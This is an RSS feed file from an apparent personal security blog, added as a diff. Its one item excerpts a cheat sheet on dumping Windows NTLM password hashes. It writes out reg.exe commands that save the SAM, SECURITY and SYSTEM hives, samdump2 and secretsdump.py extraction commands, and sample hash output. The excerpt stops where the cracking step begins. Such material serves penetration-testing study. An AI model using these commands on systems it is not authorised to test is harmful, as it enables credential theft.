@@ -1,0 +1,48 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Password-Cracking on Gajendra Mahato</title>
+    <link>http://localhost:1313/tags/password-cracking/</link>
+    <description>Recent content in Password-Cracking on Gajendra Mahato</description>
+    <generator>Hugo -- 0.155.3</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 13 Jan 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/password-cracking/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/dumping_ntlm_hashes_via_non_interactive_shell_and__cracking_it_using_various_tools/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/dumping_ntlm_hashes_via_non_interactive_shell_and__cracking_it_using_various_tools/</guid>
+      <description>&lt;h3 id=&#34;step-1--save-registry-hives-sam-security-system&#34;&gt;Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM)&lt;/h3&gt;
+&lt;p&gt;Run these commands on the target Windows machine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;reg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;save&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hklm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sam&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sam&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;reg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;save&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hklm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;security&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;security&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;reg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;save&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hklm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory.&lt;/li&gt;
+&lt;li&gt;📂 Copy these files to your attacker machine for offline cracking.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;-step-2-extract-hashes-from-saved-files&#34;&gt;🔍 Step 2: Extract Hashes from Saved Files&lt;/h1&gt;
+&lt;p&gt;Two popular tools to extract NTLM hashes:&lt;/p&gt;
+&lt;h3 id=&#34;using-samdump2&#34;&gt;Using &lt;code&gt;samdump2&lt;/code&gt;:&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;samdump2 ./system ./sam
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;using-impackets-secretsdumppy&#34;&gt;Using Impacket&amp;rsquo;s &lt;code&gt;secretsdump.py&lt;/code&gt;:&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;secretsdump.py -sam sam -system system LOCAL
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id=&#34;-sample-output-explained&#34;&gt;📄 Sample Output Explained&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;👤 &lt;strong&gt;Username&lt;/strong&gt; (e.g., Administrator)&lt;/li&gt;
+&lt;li&gt;🆔 &lt;strong&gt;User RID/Group&lt;/strong&gt; (e.g., 500)&lt;/li&gt;
+&lt;li&gt;🔐 &lt;strong&gt;LM hash&lt;/strong&gt; (usually empty/disabled)&lt;/li&gt;
+&lt;li&gt;🗝️ &lt;strong&gt;NT hash&lt;/strong&gt; (this is what you crack)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;-step-3-crack-ntlm-hashes&#34;&gt;🛠️ Step 3: Crack NTLM Hashes&lt;/h1&gt;
+&lt;p&gt;Extract NT hashes (4th field) and save in &lt;code&gt;hashes.txt&lt;/code&gt;:&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
